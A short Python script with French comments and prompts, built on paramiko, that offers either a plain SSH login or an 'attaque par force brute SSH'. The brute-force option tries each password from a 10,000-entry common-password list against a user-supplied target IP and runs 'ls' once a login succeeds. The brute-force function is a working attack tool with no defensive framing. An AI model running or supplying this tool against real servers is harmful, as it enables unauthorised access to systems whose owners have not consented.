import paramiko

def ssh_connect_with_password(server_ip, username, password):
    try:
        # Créer un client SSH
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        # Se connecter au serveur
        client.connect(server_ip, username=username, password=password)
        print(f"Connexion réussie à {server_ip}")

        # Exécuter une commande sur le serveur
        stdin, stdout, stderr = client.exec_command('ls')
        print("Sortie de la commande 'ls':")
        print(stdout.read().decode())
        
        # Fermer la connexion
        client.close()
    except Exception as e:
        print(f"Échec de la connexion à {server_ip}: {e}")

def ssh_brute_force(target_ip, username, password_list_file):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(password_list_file, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"Trying: {username}:{password}")
        try:
            ssh.connect(target_ip, username=username, password=password)
            print(f"Success: {username}:{password}")
            stdin, stdout, stderr = ssh.exec_command('ls')
            print("Command 'ls' output:")
            print(stdout.read().decode())
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Failed: {username}:{password}")
        except Exception as e:
            print(f"Error: {str(e)}")
    
    return False
if __name__ == "__main__":
    print("Choisissez une option:")
    print("1. Connexion SSH avec mot de passe")
    print("2. Attaque par force brute SSH")

    choice = input("Entrez votre choix (1 ou 2): ")

    if choice == '1':
        server_ip = input("Entrez l'adresse IP du serveur SSH : ")
        username = input("Entrez le nom d'utilisateur : ")
        password = input("Entrez le mot de passe : ")

        ssh_connect_with_password(server_ip, username, password)
    elif choice == '2':
        target_ip = input("Entrez l'adresse IP de la cible : ")
        username = input("Entrez le nom d'utilisateur de la cible : ")
        password_list_file = "10-million-password-list-top-10000.txt"

        success = ssh_brute_force(target_ip, username, password_list_file)
        if success:
            print("Brute force réussie.")
        else:
            print("Brute force échouée.")
    else:
        print("Choix invalide. Veuillez entrer 1 ou 2.")